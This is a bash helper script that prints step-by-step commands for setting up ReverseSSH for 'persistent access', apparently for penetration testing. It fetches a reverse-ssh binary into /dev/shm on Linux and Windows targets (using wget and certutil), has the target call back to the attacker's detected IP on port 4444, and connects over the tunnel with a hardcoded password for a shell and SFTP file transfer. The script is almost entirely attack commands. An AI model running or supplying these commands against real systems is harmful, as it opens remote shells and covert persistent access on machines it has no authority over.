#!/bin/bash
# ReverseSSH Setup Helper
# Automates the setup of ReverseSSH for persistent access

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}=== ReverseSSH Setup Helper ===${NC}"
echo ""

# Get attacker IP (try multiple methods)
ATTACKER_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || \
               ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' || \
               ifconfig 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -1 || \
               echo "YOUR_IP")

ATTACKER_USER=$(whoami)
PORT="4444"

echo -e "${YELLOW}Configuration:${NC}"
echo "Attacker IP: $ATTACKER_IP"
echo "Attacker User: $ATTACKER_USER"
echo "Port: $PORT"
echo ""

echo -e "${GREEN}=== Step 1: Setup Listener (run on attacker) ===${NC}"
echo ""
echo "# Download and prepare"
echo "wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh"
echo "chmod +x /dev/shm/reverse-ssh"
echo ""
echo "# Start listener"
echo "/dev/shm/reverse-ssh -v -l -p $PORT"
echo ""

echo -e "${GREEN}=== Step 2: Deploy to Target ===${NC}"
echo ""
echo -e "${YELLOW}For Linux target:${NC}"
echo "wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh"
echo "chmod +x /dev/shm/reverse-ssh"
echo "/dev/shm/reverse-ssh -p $PORT $ATTACKER_USER@$ATTACKER_IP"
echo ""
echo -e "${YELLOW}For Windows target:${NC}"
echo "certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe"
echo "reverse-ssh.exe -p $PORT $ATTACKER_USER@$ATTACKER_IP"
echo ""

echo -e "${GREEN}=== Step 3: Connect After Setup ===${NC}"
echo ""
echo "# Interactive shell (password: letmeinbrudipls)"
echo "ssh -p 8888 127.0.0.1"
echo ""
echo "# File transfer"
echo "sftp -P 8888 127.0.0.1"
echo ""
echo -e "${GREEN}=== Done ===${NC}"
